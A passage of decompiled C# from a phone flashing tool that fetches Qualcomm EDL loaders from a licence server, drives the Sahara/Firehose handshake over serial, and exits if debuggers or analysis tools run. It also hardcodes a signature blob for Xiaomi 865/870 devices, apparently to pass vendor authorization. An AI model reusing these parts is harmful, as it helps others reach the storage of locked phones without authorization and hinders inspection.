		string[] array = new string[8] { "OllyDbg", "x64dbg", "x32dbg", "SimpleProcessInterceptor", "ida", "HRSword", "火绒剑", "简易进程拦截器" };
		string[] array2 = array;
		foreach (string processName in array2)
		{
			Process[] processesByName = Process.GetProcessesByName(processName);
			if (processesByName.Length != 0)
			{
				return 1u;
			}
		}
		return 0u;
	}

	private void _14()
	{
		try
		{
			((Control)this).Invoke((Delegate)(System.Windows.Forms.MethodInvoker)(() =>
			{
				((Form)this).Close();
			}));
			UIMessageBox.Show("检测到不允许的工具，程序将关闭。", "警告", (UIStyle)4, (UIMessageBoxButtons)0, false, true, 0);
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error closing application window: " + ex.Message);
		}
		finally
		{
			Application.Exit();
		}
	}

	public void SetLastClickedButton(Button button)
	{
		this.m_11 = button;
	}

	public void ReexecuteLastClickedButton()
	{
		if (this.m_11 != null)
		{
			((Button)this.m_11).PerformClick();
		}
	}

	public void kuaijie()
	{
		if (this.m_12 != null && ((ToolStripItem)this.m_12).Owner != null)
		{
			((ToolStripItem)this.m_12).Owner.Invoke((Action)(() =>
			{
				((ToolStripItem)this.m_12)?.PerformClick();
			}));
		}
		this.m_12 = null;
	}

	public void EnableButtons()
	{
		if (((Control)this).InvokeRequired)
		{
			((Control)this).Invoke((Delegate)new Action(EnableButtons));
			return;
		}
		((Control)this.m_ed).Enabled = true;
		((Control)_88).Enabled = true;
		((Control)this.m_c9).Enabled = true;
		((Control)this.m_cb).Enabled = true;
		((Control)this.m_89).Enabled = true;
		((Control)this.m_c2).Enabled = true;
		((Control)this.m_ec).Enabled = true;
		((Control)this.m_c6).Enabled = true;
		((Control)this.m_c2).Enabled = true;
		((Control)this.m_c9).Enabled = true;
		((Control)this.m_ee).Enabled = true;
		((Control)this.m_ef).Enabled = true;
		((Control)this.m_f3).Enabled = true;
		((Control)this.m_f4).Enabled = true;
		((Control)f1).Enabled = true;
		((Control)this.m_f2).Enabled = true;
		((Control)this.m_fa).Enabled = true;
		((Control)this.m_ce).Enabled = true;
		((Control)this.m_db).Enabled = true;
		((Control)this.m_df).Enabled = true;
		((Control)this.m_e2).Enabled = true;
		((Control)this.m_100).Enabled = true;
		((Control)this.m_f5).Enabled = true;
		((Control)this.m_f6).Enabled = true;
		((Control)this.m_131).Enabled = true;
		((Control)this.m_132).Enabled = true;
		((Control)this.m_175).Enabled = true;
		((Control)this.m_ea).Enabled = true;
		((Control)_160).Enabled = true;
		((Control)this.m_15f).Enabled = true;
		((Control)this.m_156).Enabled = true;
		((Control)this.m_117).Enabled = true;
		((Control)this.m_118).Enabled = true;
		((Control)this.m_119).Enabled = true;
	}

	public void falseButtons()
	{
		if (((Control)this).InvokeRequired)
		{
			((Control)this).Invoke((Delegate)new Action(falseButtons));
			return;
		}
		((Control)this.m_ed).Enabled = false;
		((Control)_88).Enabled = false;
		((Control)this.m_c9).Enabled = false;
		((Control)this.m_cb).Enabled = false;
		((Control)this.m_89).Enabled = false;
		((Control)this.m_c2).Enabled = false;
		((Control)this.m_ec).Enabled = false;
		((Control)this.m_c6).Enabled = false;
		((Control)this.m_c2).Enabled = false;
		((Control)this.m_ee).Enabled = false;
		((Control)this.m_ef).Enabled = false;
		((Control)this.m_f3).Enabled = false;
		((Control)this.m_f4).Enabled = false;
		((Control)f1).Enabled = false;
		((Control)this.m_f2).Enabled = false;
		((Control)this.m_fa).Enabled = false;
		((Control)this.m_ce).Enabled = false;
		((Control)this.m_db).Enabled = false;
		((Control)this.m_df).Enabled = false;
		((Control)this.m_e2).Enabled = false;
		((Control)this.m_100).Enabled = false;
		((Control)this.m_f5).Enabled = false;
		((Control)this.m_f6).Enabled = false;
		((Control)this.m_131).Enabled = false;
		((Control)this.m_132).Enabled = false;
		((Control)this.m_175).Enabled = false;
		((Control)this.m_ea).Enabled = false;
		((Control)_160).Enabled = false;
		((Control)this.m_15f).Enabled = false;
		((Control)this.m_156).Enabled = false;
		((Control)this.m_117).Enabled = false;
		((Control)this.m_118).Enabled = false;
		((Control)this.m_119).Enabled = false;
	}

	public void EnableButtons2()
	{
		((Checkbox)this.m_109).Checked = true;
	}

	public void UpdateRichTextBox(string message, Color color)
	{
		if (((Control)this.m_c8).InvokeRequired)
		{
			((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
			{
				((RichTextBox)this.m_c8).SelectionColor = color;
				((TextBoxBase)this.m_c8).AppendText(message + Environment.NewLine);
			}));
		}
		else
		{
			((RichTextBox)this.m_c8).SelectionColor = color;
			((TextBoxBase)this.m_c8).AppendText(message + Environment.NewLine);
		}
	}

	private void _1c(object sender, EventArgs e)
	{
	}

	private async void _1d(object sender, object e)
	{
	}

	public async Task<string> GiveLoader(string apis)
	{
		try
		{
			object obj = await ((HttpClient)_52).GetAsync(apis);
			((HttpResponseMessage)obj).EnsureSuccessStatusCode();
			return await ((HttpResponseMessage)obj).Content.ReadAsStringAsync();
		}
		catch (Exception ex)
		{
			object obj2 = ex;
			return ((Exception)obj2).Message ?? "";
		}
	}

	private object _1f(object hex)
	{
		string hex2 = (string)hex;
		if (hex2.Length % 2 != 0)
		{
			throw new ArgumentException("Hex字符串的长度必须是偶数");
		}
		return (from i in Enumerable.Range(0, hex2.Length)
			where i % 2 == 0
			select Convert.ToByte(hex2.Substring(i, 2), 16)).ToArray();
	}

	public async Task<byte[]> DownloadBytesWithProgress(string url)
	{
		object obj = new _003C_003Ec__DisplayClass83_0();
		((_003C_003Ec__DisplayClass83_0)obj)._003C_003E4__this = this;
		((_003C_003Ec__DisplayClass83_0)obj).lastBytes = 0L;
		((_003C_003Ec__DisplayClass83_0)obj).lastTime = DateTime.Now;
		object obj2 = new WebClient();
		try
		{
			object CS_0024_003C_003E8__locals8 = new _003C_003Ec__DisplayClass83_1();
			((_003C_003Ec__DisplayClass83_1)CS_0024_003C_003E8__locals8).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass83_0)obj;
			((UIProcessBar)this.m_c1).Value = 0;
			((UIProcessBar)this.m_c1).Maximum = 100;
			((_003C_003Ec__DisplayClass83_1)CS_0024_003C_003E8__locals8).tcs = new TaskCompletionSource<byte[]>();
			((WebClient)obj2).DownloadProgressChanged += (object s, DownloadProgressChangedEventArgs e) =>
			{
				_003C_003Ec__DisplayClass83_0 obj3 = ((_003C_003Ec__DisplayClass83_1)CS_0024_003C_003E8__locals8).CS_0024_003C_003E8__locals1;
				((Control)((_003C_003Ec__DisplayClass83_1)CS_0024_003C_003E8__locals8).CS_0024_003C_003E8__locals1._003C_003E4__this.m_c1).Invoke((Delegate)(System.Windows.Forms.MethodInvoker)(() =>
				{
					((UIProcessBar)obj3._003C_003E4__this.m_c1).Value = e.ProgressPercentage;
					DateTime now = DateTime.Now;
					TimeSpan timeSpan = now - obj3.lastTime;
					long num = e.BytesReceived - obj3.lastBytes;
					if (timeSpan.TotalSeconds > 0.5)
					{
						double num2 = (double)num / timeSpan.TotalSeconds / 1024.0;
						((Control)obj3._003C_003E4__this.m_cd).Text = $"Spd: {num2:F2} KB/s";
						obj3.lastTime = now;
						obj3.lastBytes = e.BytesReceived;
					}
					double num3 = (double)e.BytesReceived / 1024.0 / 1024.0;
					double num4 = (double)e.TotalBytesToReceive / 1024.0 / 1024.0;
					((Control)obj3._003C_003E4__this.m_cf).Text = $"Download {num3:F2} MB / {num4:F2} MB";
				}));
			};
			((WebClient)obj2).DownloadDataCompleted += (object s, DownloadDataCompletedEventArgs e) =>
			{
				_003C_003Ec__DisplayClass83_1 obj3 = (_003C_003Ec__DisplayClass83_1)CS_0024_003C_003E8__locals8;
				((Control)((_003C_003Ec__DisplayClass83_1)CS_0024_003C_003E8__locals8).CS_0024_003C_003E8__locals1._003C_003E4__this.m_c1).Invoke((Delegate)(System.Windows.Forms.MethodInvoker)(() =>
				{
					if (e.Error != null)
					{
						obj3.CS_0024_003C_003E8__locals1._003C_003E4__this.msgred();
						obj3.CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("ERROR\n");
						obj3.tcs.SetException(e.Error);
					}
					else
					{
						obj3.CS_0024_003C_003E8__locals1._003C_003E4__this.fa();
						obj3.CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("OK\n");
						obj3.tcs.SetResult(e.Result);
					}
				}));
			};
			try
			{
				((WebClient)obj2).DownloadDataAsync(new Uri(url));
			}
			catch (Exception ex)
			{
				object exception = ex;
				Msg("ERROR\n");
				((_003C_003Ec__DisplayClass83_1)CS_0024_003C_003E8__locals8).tcs.SetException((Exception)exception);
			}
			return await ((_003C_003Ec__DisplayClass83_1)CS_0024_003C_003E8__locals8).tcs.Task;
		}
		finally
		{
			((IDisposable)obj2)?.Dispose();
		}
	}

	private async Task<string> _21()
	{
		long num = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
		object obj = $"username={_24}&password={this.m_27}&timestamp={num}";
		object mD5Hash = AesHelper.GetMD5Hash((string)obj + SigKey);
		object obj2 = new
		{
			username = (string)_24,
			password = (string)this.m_27,
			Timestamp = num,
			Hwid = (string)_2a,
			Token = (string)this.m_29,
			Sign = (string)mD5Hash
		};
		object plainText = JsonConvert.SerializeObject(obj2);
		object stringToEscape = AesHelper.Encrypt((string)plainText);
		return Uri.EscapeDataString((string)stringToEscape);
	}

	private async void _22(object sender, object e)
	{
		this.m_34 = null;
		object path = "C:\\TMFTool";
		object path2 = "TAMIM.elf";
		object obj = Path.Combine((string)path, (string)path2);
		File.Delete((string)obj);
		object text = ((Control)this.m_10a).Text;
		if (!string.IsNullOrEmpty((string)text))
		{
			if (((string)text).StartsWith("官方:"))
			{
				nint num = ((string)text).IndexOf(':');
				text = ((string)text).Substring((int)(num + 1)).Trim();
				if (lang == "zh")
				{
					Msg("芯片方案: " + (string)text + "\n");
					Msg("请求服务器...");
				}
				else
				{
					Msg("chip: " + (string)text + "\n");
					Msg("Sending server...");
				}
				long num2 = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
				object obj2 = $"username={_24}&password={this.m_27}&timestamp={num2}";
				object mD5Hash = AesHelper.GetMD5Hash((string)obj2 + SigKey);
				object obj3 = new
				{
					username = (string)_24,
					password = (string)this.m_27,
					Timestamp = num2,
					Token = (string)this.m_29,
					Loadename = (string)text,
					Sign = (string)mD5Hash
				};
				object plainText = JsonConvert.SerializeObject(obj3);
				object stringToEscape = AesHelper.Encrypt((string)plainText);
				object obj4 = Uri.EscapeDataString((string)stringToEscape);
				object obj5 = await HttpHelper.Get(Url: "/api/V1/offload?encryptedRequest=" + (string)obj4, api: (string)this.m_25);
				nint num3 = ((JToken)obj5).Value<int>((object)"code");
				object obj6 = ((JToken)obj5).Value<string>((object)"message");
				object obj7 = ((JToken)obj5).Value<string>((object)"hex");
				object obj8 = ((JToken)obj5).Value<string>((object)"sig");
				if (num3 != 200)
				{
					msgred();
					Msg((string)obj6 + "\n");
					EnableButtons();
					return;
				}
				this.m_6e = obj8;
				this.m_33 = obj7;
				fa();
				Msg("OK\n");
				if (lang == "en")
				{
					Msg("The server responds...");
				}
				else
				{
					Msg("服务器回应...");
				}
				if (obj7 != null && (((string)obj7).Contains("http://") || ((string)obj7).Contains("https://")))
				{
					object obj9 = new Uri((string)obj7);
					_ = ((Uri)obj9).Scheme + "://";
					object obj10 = ((Uri)obj9).AbsolutePath + (string.IsNullOrEmpty(((Uri)obj9).Query) ? "" : ((Uri)obj9).Query);
					object url = ((!((string)text).Contains("Link")) ? obj7 : string.Concat(str2: "?encryptedRequest=" + await _21(), str0: (string)this.m_25, str1: (string)obj10));
					try
					{
						this.m_34 = await DownloadBytesWithProgress((string)url);
					}
					catch (Exception ex)
					{
						Msg(ex.Message + "\n");
						EnableButtons();
						return;
					}
				}
				else
				{
					try
					{
						this.m_6e = obj8;
						if (!string.IsNullOrEmpty((string)obj7))
						{
							this.m_34 = _1f(obj7);
						}
						fa();
						Msg("OK\n");
					}
					catch (Exception ex2)
					{
						object obj11 = ex2;
						Msg(((Exception)obj11).Message + "\n");
						msgred();
						Msg("Error\n");
						return;
					}
				}
				if (!string.IsNullOrEmpty((string)obj8))
				{
					this.m_6f = "3";
				}
				else
				{
					this.m_6f = "2";
				}
				if ((string)text == "高通骁龙芯片（Qualcomm XiaoLong EDL ELF）")
				{
					this.m_6f = "1";
				}
				if ((string)text == "小米红米黑鲨865_870自选引导")
				{
					this.m_6f = "4";
					this.m_6e = "BF35D6013A39D6166BE0387E6B9B00FD0E096283F811EDE81594866CF676B41B1A32EA67FBAB4F6D90E45C944B53302A1DA32D94F30A68E1EB116672B02920089AA938F91464D6926C42A93D0EAE88E549A49C00FCF9B1B89EF68A7CD23DEBEB88C01D850ACD52A832BB80134C4B0E2A7A1422E2530C19B309EBA1FF7E123A34DD3B83DCFACDCE45F303D135FE58899E531E1CF7155D48BFF18AB3E5FC1A2E85FBB015DE2A3CFC8EE51AA453F7DEBC4A095861DA1637C8DF4D9CF64EC4A5F45486AD73FB036965B94E1EE8F4077FFB54E90AF0AB52BF02E499517FB7D1028ABCBA1B98951843B2A8C964B4D94801BAF630C6179FA6F86371830A484F2792D491";
				}
			}
			else if (((string)text).StartsWith("分享人;") || ((string)text).StartsWith("云端私有;"))
			{
				nint num4 = ((string)text).IndexOf(':');
				text = ((string)text).Substring((int)(num4 + 1)).Trim();
				if (lang == "zh")
				{
					Msg("芯片方案: 用户云端\n");
					Msg("请求服务器...");
				}
				else
				{
					Msg(" Chip solution: user cloud\n");
					Msg("Sending server...");
				}
				long num5 = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
				object obj12 = $"username={_24}&password={this.m_27}&timestamp={num5}";
				object mD5Hash2 = AesHelper.GetMD5Hash((string)obj12 + SigKey);
				object obj13 = new
				{
					username = (string)_24,
					password = (string)this.m_27,
					Timestamp = num5,
					Token = (string)this.m_29,
					Loadename = (string)text,
					Sign = (string)mD5Hash2
				};
				object plainText2 = JsonConvert.SerializeObject(obj13);
				object stringToEscape2 = AesHelper.Encrypt((string)plainText2);
				object obj14 = Uri.EscapeDataString((string)stringToEscape2);
				object obj15 = await HttpHelper.Get(Url: "/api/V1/userolader?encryptedRequest=" + (string)obj14, api: (string)this.m_25);
				nint num6 = ((JToken)obj15).Value<int>((object)"code");
				((JToken)obj15).Value<string>((object)"message");
				object obj16 = ((JToken)obj15).Value<string>((object)"hex");
				object obj17 = ((JToken)obj15).Value<string>((object)"sig");
				if (num6 != 200)
				{
					msgred();
					Msg("Error\n");
					EnableButtons();
					return;
				}
				this.m_33 = obj16;
				this.m_6e = obj17;
				fa();
				Msg("OK\n");
				if (lang == "en")
				{
					Msg("The server responds...");
				}
				else
				{
					Msg("服务器回应...");
				}
				if (obj16 != null && (((string)obj16).Contains("http://") || ((string)obj16).Contains("https://")))
				{
					try
					{
						this.m_34 = await DownloadBytesWithProgress((string)obj16);
					}
					catch (Exception ex2)
					{
						object obj18 = ex2;
						Msg(((Exception)obj18).Message + "\n");
						EnableButtons();
						return;
					}
				}
				else
				{
					try
					{
						this.m_6e = obj17;
						this.m_34 = _1f(obj16);
						fa();
						Msg("OK\n");
					}
					catch (Exception ex2)
					{
						object obj19 = ex2;
						Msg(((Exception)obj19).Message + "\n");
						msgred();
						Msg("Error\n");
						return;
					}
				}
				if (!string.IsNullOrEmpty((string)obj17))
				{
					this.m_6f = "3";
				}
				else
				{
					this.m_6f = "2";
				}
			}
			else
			{
				Msg("?");
			}
		}
		_ = this.m_6d;
		object sig = this.m_6e;
		object obj20 = this.m_6f;
		nint num7 = await _28();
		IntPtr intPtr = num7;
		if (intPtr == (IntPtr)0)
		{
			msgred();
			Msg("SAHARA 通讯错误!重新进入端口尝试\n");
			EnableButtons();
			return;
		}
		if (((string)obj20 == "1" || (string)obj20 == "4") && intPtr == (IntPtr)1)
		{
			if (string.IsNullOrEmpty(((Control)this.m_c3).Text))
			{
				Log2("引导文件未选择", Color.Red, isBold: false, newline: true);
				EnableButtons();
				return;
			}
			WriteData.Firehose_Programmer = ((Control)this.m_c3).Text;
			this.m_9 = File.ReadAllBytes(WriteData.Firehose_Programmer);
		}
		if ((string)obj20 == "2" || (string)obj20 == "3")
		{
			this.m_9 = this.m_34;
		}
		if (intPtr == (IntPtr)1)
		{
			nint num8 = ((await _23(this.m_9)) ? 1 : 0);
			IntPtr intPtr2 = num8;
			if (intPtr2 == (IntPtr)0)
			{
				EnableButtons();
				return;
			}
			if ((string)obj20 == "2" || (string)obj20 == "3")
			{
				File.Delete((string)obj);
			}
		}
		if ((string)obj20 == "1" || (string)obj20 == "2")
		{
			await Task.Delay(100);
			_25();
		}
		else if ((string)obj20 == "3" || (string)obj20 == "4")
		{
			await Task.Delay(100);
			_2b(sig);
		}
	}

	private async Task<bool> _23(object loader)
	{
		if (loader == null || ((Array)loader).Length == 0)
		{
			Log2("引导文件内容为空", Color.Red, isBold: false, newline: true);
			EnableButtons();
			return false;
		}
		if (lang == "en")
		{
			Log2("Open Port:", Color.Black, isBold: false, newline: true);
		}
		else
		{
			Log2("打开端口:", Color.Black, isBold: false, newline: true);
		}
		Log2(PortQcom ?? "", Color.DodgerBlue, isBold: false);
		if (_35(new SerialPort(PortQcom, 9600)) == 0)
		{
			Log2((lang == "en") ? ("Port occupancy " + PortQcom) : ("无法打开 " + PortQcom), Color.Red, isBold: false, newline: true);
			EnableButtons();
			return false;
		}
		comm.StartReading();
		_33(loader);
		comm.StopReading();
		await Task.Delay(200);
		return true;
	}

	public static byte[] HexStringToByteArrays(string hex)
	{
		int length = hex.Length;
		byte[] array = new byte[length / 2];
		for (int i = 0; i < length; i += 2)
		{
			array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
		}
		return array;
	}

	private async void _25()
	{
		object CS_0024_003C_003E8__locals19 = new _003C_003Ec__DisplayClass90_0();
		((_003C_003Ec__DisplayClass90_0)CS_0024_003C_003E8__locals19)._003C_003E4__this = this;
		if (lang == "zh")
		{
			Log2("配置设备...", Color.Black, isBold: false, newline: true);
		}
		else
		{
			Log2("Reading configuration...", Color.Black, isBold: false, newline: true);
		}
		((_003C_003Ec__DisplayClass90_0)CS_0024_003C_003E8__locals19).ConRes = -2;
		object obj = new _003C_003Ec__DisplayClass90_1();
		((_003C_003Ec__DisplayClass90_1)obj).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass90_0)CS_0024_003C_003E8__locals19;
		((_003C_003Ec__DisplayClass90_1)obj).SepSl = new SerialPort(PortQcom, 9600);
		try
		{
			object CS_0024_003C_003E8__locals15 = new _003C_003Ec__DisplayClass90_2();
			((_003C_003Ec__DisplayClass90_2)CS_0024_003C_003E8__locals15).CS_0024_003C_003E8__locals2 = (_003C_003Ec__DisplayClass90_1)obj;
			try
			{
				((_003C_003Ec__DisplayClass90_2)CS_0024_003C_003E8__locals15).CS_0024_003C_003E8__locals2.SepSl.Open();
			}
			catch
			{
				msgred();
				Log2("蜡笔了", Color.Red, isBold: false);
				EnableButtons();
				return;
			}
			object memName = "ufs";
			if (((UIRadioButton)this.m_d9).Checked)
			{
				memName = "emmc";
			}
			((_003C_003Ec__DisplayClass90_2)CS_0024_003C_003E8__locals15).xml = firehose_pkts.pkt_fhConfig1((string)memName);
			object text = ((Control)this.m_10a).Text;
			if (((string)text).Contains("ZTE"))
			{
				((_003C_003Ec__DisplayClass90_2)CS_0024_003C_003E8__locals15).xml = firehose_pkts.configZTE();
			}
			await Task.Run(async () =>
			{
				nint num = await LinQcPortClass.SendCon(((_003C_003Ec__DisplayClass90_2)CS_0024_003C_003E8__locals15).CS_0024_003C_003E8__locals2.SepSl, ((_003C_003Ec__DisplayClass90_2)CS_0024_003C_003E8__locals15).xml);
				((_003C_003Ec__DisplayClass90_2)CS_0024_003C_003E8__locals15).CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.ConRes = (int)num;
			});
			((_003C_003Ec__DisplayClass90_2)CS_0024_003C_003E8__locals15).CS_0024_003C_003E8__locals2.SepSl.Close();
		}
		finally
		{
			if (((_003C_003Ec__DisplayClass90_1)obj).SepSl != null)
			{
				((IDisposable)((_003C_003Ec__DisplayClass90_1)obj).SepSl).Dispose();
			}
		}
		if (((_003C_003Ec__DisplayClass90_0)CS_0024_003C_003E8__locals19).ConRes == 1)
		{
			msgred();
			if (lang == "zh")
			{
				Log2("需要认证", Color.Red, isBold: false);
			}
			else
			{
				Log2("Authorization required", Color.Red, isBold: false);
			}
			OpenDisk(PortQcom);
			_2e();
			DiskClose();
		}
		else if (((_003C_003Ec__DisplayClass90_0)CS_0024_003C_003E8__locals19).ConRes == 0)
		{
			fa();
			if (lang == "zh")
			{
				Msg("自由读写\n");
			}
			else
			{
				Msg("OK\n");
			}
			((Checkbox)this.m_109).Checked = true;
			EnableButtons();
			if (this.m_11 != null)
			{
				if (((Control)this.m_11).InvokeRequired)
				{
					((Control)this.m_11).Invoke((Delegate)(Action)(() =>
					{
						((Button)((_003C_003Ec__DisplayClass90_0)CS_0024_003C_003E8__locals19)._003C_003E4__this.m_11).PerformClick();
					}));
				}
				else
				{
					((Button)this.m_11).PerformClick();
				}
			}
			this.m_11 = null;
			if (this.m_12 != null && ((ToolStripItem)this.m_12).Owner != null)
			{
				((ToolStripItem)this.m_12).Owner.Invoke((Action)(() =>
				{
					((ToolStripItem)((_003C_003Ec__DisplayClass90_0)CS_0024_003C_003E8__locals19)._003C_003E4__this.m_12)?.PerformClick();
				}));
			}
			this.m_12 = null;
		}
		else if (((_003C_003Ec__DisplayClass90_0)CS_0024_003C_003E8__locals19).ConRes == 4)
		{
			fa();
			if (lang == "zh")
			{
				Msg("自由读写\n");
			}
			else
			{
				Msg("OK\n");
			}
			((Checkbox)this.m_109).Checked = true;
			EnableButtons();
			((UIRadioButton)this.m_d9).Checked = true;
			if (this.m_11 != null)
			{
				if (((Control)this.m_11).InvokeRequired)
				{
					((Control)this.m_11).Invoke((Delegate)(Action)(() =>
					{
						((Button)((_003C_003Ec__DisplayClass90_0)CS_0024_003C_003E8__locals19)._003C_003E4__this.m_11).PerformClick();
					}));
				}
				else
				{
					((Button)this.m_11).PerformClick();
				}
			}
			this.m_11 = null;
			if (this.m_12 != null && ((ToolStripItem)this.m_12).Owner != null)
			{
				((ToolStripItem)this.m_12).Owner.Invoke((Action)(() =>
				{
					((ToolStripItem)((_003C_003Ec__DisplayClass90_0)CS_0024_003C_003E8__locals19)._003C_003E4__this.m_12)?.PerformClick();
				}));
			}
			this.m_12 = null;
		}
		else
		{
			msgred();
			Msg("Error\n");
			EnableButtons();
		}
	}

	private async Task<bool> _26()
	{
		object obj = new _003C_003Ec__DisplayClass91_0();
		if (lang == "zh")
		{
			Log2("配置设备...", Color.Black, isBold: false, newline: true);
		}
		else
		{
			Log2("Reading configuration...", Color.Black, isBold: false, newline: true);
		}
		((_003C_003Ec__DisplayClass91_0)obj).ConRes = -2;
		object obj2 = new _003C_003Ec__DisplayClass91_1();
		((_003C_003Ec__DisplayClass91_1)obj2).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass91_0)obj;
		((_003C_003Ec__DisplayClass91_1)obj2).SepSl = new SerialPort(((Control)this.m_126).Text, 9600);
		try
		{
			object CS_0024_003C_003E8__locals7 = new _003C_003Ec__DisplayClass91_2();
			((_003C_003Ec__DisplayClass91_2)CS_0024_003C_003E8__locals7).CS_0024_003C_003E8__locals2 = (_003C_003Ec__DisplayClass91_1)obj2;
			try
			{
				((_003C_003Ec__DisplayClass91_2)CS_0024_003C_003E8__locals7).CS_0024_003C_003E8__locals2.SepSl.Open();
			}
			catch
			{
				msgred();
				Log2("蜡笔了", Color.Red, isBold: false);
				EnableButtons();
				return false;
			}
			object memName = "ufs";
			if (((UIRadioButton)this.m_d9).Checked)
			{
				memName = "emmc";
			}
			((_003C_003Ec__DisplayClass91_2)CS_0024_003C_003E8__locals7).xml = firehose_pkts.pkt_fhConfig1((string)memName);
			await Task.Run(async () =>
			{
				nint num = await LinQcPortClass.SendCon(((_003C_003Ec__DisplayClass91_2)CS_0024_003C_003E8__locals7).CS_0024_003C_003E8__locals2.SepSl, ((_003C_003Ec__DisplayClass91_2)CS_0024_003C_003E8__locals7).xml);
				((_003C_003Ec__DisplayClass91_2)CS_0024_003C_003E8__locals7).CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.ConRes = (int)num;
			});
			((_003C_003Ec__DisplayClass91_2)CS_0024_003C_003E8__locals7).CS_0024_003C_003E8__locals2.SepSl.Close();
		}
		finally
		{
			if (((_003C_003Ec__DisplayClass91_1)obj2).SepSl != null)
			{
				((IDisposable)((_003C_003Ec__DisplayClass91_1)obj2).SepSl).Dispose();
			}
		}
		if (((_003C_003Ec__DisplayClass91_0)obj).ConRes == 1)
		{
			msgred();
			if (lang == "zh")
			{
				Log2("需要认证", Color.Red, isBold: false);
			}
			else
			{
				Log2("Authorization required", Color.Red, isBold: false);
			}
			EnableButtons();
			return false;
		}
		if (((_003C_003Ec__DisplayClass91_0)obj).ConRes == 0)
		{
			fa();
			if (lang == "zh")
			{
				Msg("自由读写\n");
			}
			else
			{
				Msg("OK\n");
			}
			((Checkbox)this.m_109).Checked = true;
			EnableButtons();
			return true;
		}
		if (((_003C_003Ec__DisplayClass91_0)obj).ConRes == 4)
		{
			fa();
			if (lang == "zh")
			{
				Msg("自由读写\n");
			}
			else
			{
				Msg("OK\n");
			}
			((Checkbox)this.m_109).Checked = true;
			EnableButtons();
			((UIRadioButton)this.m_d9).Checked = true;
			return true;
		}
		msgred();
		Msg("Error\n");
		EnableButtons();
		return false;
	}

	private static uint _27(object array, uint startIndex, object pattern)
	{
		for (int i = (int)startIndex; i <= ((Array)array).Length - ((Array)pattern).Length; i++)
		{
			if (((IEnumerable<byte>)array).Skip(i).Take(((Array)pattern).Length).SequenceEqual((IEnumerable<byte>)pattern))
			{
				return (uint)i - startIndex;
			}
		}
		return uint.MaxValue;
	}

	private async Task<int> _28()
	{
		try
		{
			Msg("\n链接设备...");
			Form1.m_35 = new SerialPort(PortQcom, 9600, Parity.None, 8, StopBits.One);
			((SerialPort)Form1.m_35).ReadTimeout = 200;
			((SerialPort)Form1.m_35).WriteTimeout = 200;
			((SerialPort)Form1.m_35).Open();
			object obj = new byte[48];
			nint num;
			if (((SerialPort)Form1.m_35).BytesToRead > 0)
			{
				try
				{
					num = ((SerialPort)Form1.m_35).Read((byte[])obj, 0, ((Array)obj).Length);
				}
				catch (Exception)
				{
					msgred();
					Msg("Error\n");
					return 0;
				}
			}
			else
			{
				object obj2 = new CommandHelper();
				((CommandHelper)obj2).Dword(19u);
				((CommandHelper)obj2).Dword(8u);
				obj = ((CommandHelper)obj2).GetCmd();
				((SerialPort)Form1.m_35).Write((byte[])obj, 0, ((Array)obj).Length);
				Thread.Sleep(10);
				obj = new byte[48];
				try
				{
					num = ((SerialPort)Form1.m_35).Read((byte[])obj, 0, ((Array)obj).Length);
				}
				catch (Exception)
				{
					msgred();
					Msg("Error\n");
					return 0;
				}
			}
			if (num == 0)
			{
				msgred();
				Msg("Error\n");
				return 0;
			}
			if (num != ((Array)obj).Length)
			{
				if (Encoding.UTF8.GetString((byte[])obj).IndexOf("<?xml") > -1)
				{
					fa();
					Msg("FIREHOSE\n");
					return 2;
				}
				msgred();
				Msg("Error\n");
				return 0;
			}
			if (((byte[])obj)[0] == 1)
			{
				_36 = new StructHelper((byte[])obj);
				uint num2 = ((StructHelper)_36).Dword(false);
				((StructHelper)_36).Dword(false);
				switch (num2)
				{
				case 1u:
				{
					uint num3 = ((StructHelper)_36).Dword(false);
					uint value = ((StructHelper)_36).Dword(false);
					((StructHelper)_36).Dword(false);
					uint num4 = ((StructHelper)_36).Dword(false);
					fa();
					Msg("SAHARA\n");
					Msg("       SAHARA_VERSION: ");
					fa();
					Msg($"{num3}\n");
					if (num4 == 2)
					{
						Msg("SAHARA\n");
						return 1;
					}
					if (((Checkbox)this.m_142).Checked)
					{
						Msg("兼容模式开启...直接进行引导设备\n");
						return 1;
					}
					if (num3 <= 2)
					{
						object obj3 = new CommandHelper();
						((CommandHelper)obj3).Dword(2u);
						((CommandHelper)obj3).Dword(48u);
						((CommandHelper)obj3).Dword(num3);
						((CommandHelper)obj3).Dword(value);
						((CommandHelper)obj3).Dword(0u);
						((CommandHelper)obj3).Dword(3u);
						((CommandHelper)obj3).Dword(1u);
						((CommandHelper)obj3).Dword(2u);
						((CommandHelper)obj3).Dword(3u);
						((CommandHelper)obj3).Dword(4u);
						((CommandHelper)obj3).Dword(5u);
						((CommandHelper)obj3).Dword(6u);
						obj = ((CommandHelper)obj3).GetCmd();
						((SerialPort)Form1.m_35).Write((byte[])obj, 0, ((Array)obj).Length);
						Thread.Sleep(10);
						obj = new byte[((SerialPort)Form1.m_35).BytesToRead];
						((SerialPort)Form1.m_35).Read((byte[])obj, 0, ((Array)obj).Length);
						_36 = new StructHelper((byte[])obj);
						num2 = ((StructHelper)_36).Dword(false);
						((StructHelper)_36).Dword(false);
						if (num2 != 11)
						{
							msgred();
							Msg("获取描述符失败！\n");
							return 0;
						}
						object obj4 = new CommandHelper();
						((CommandHelper)obj4).Dword(13u);
						((CommandHelper)obj4).Dword(12u);
						((CommandHelper)obj4).Dword(2u);
						obj = ((CommandHelper)obj4).GetCmd();
						((SerialPort)Form1.m_35).Write((byte[])obj, 0, ((Array)obj).Length);
						Thread.Sleep(10);
						obj = new byte[((SerialPort)Form1.m_35).BytesToRead];
						((SerialPort)Form1.m_35).Read((byte[])obj, 0, ((Array)obj).Length);
						_36 = new StructHelper((byte[])obj);
						num2 = ((StructHelper)_36).Dword(false);
						if (num2 != 14)
						{
							msgred();
							Msg("Error\n");
							return 0;
						}
						_36 = new StructHelper((byte[])obj);
						((StructHelper)_36).Dword(false);
						((StructHelper)_36).Dword(false);
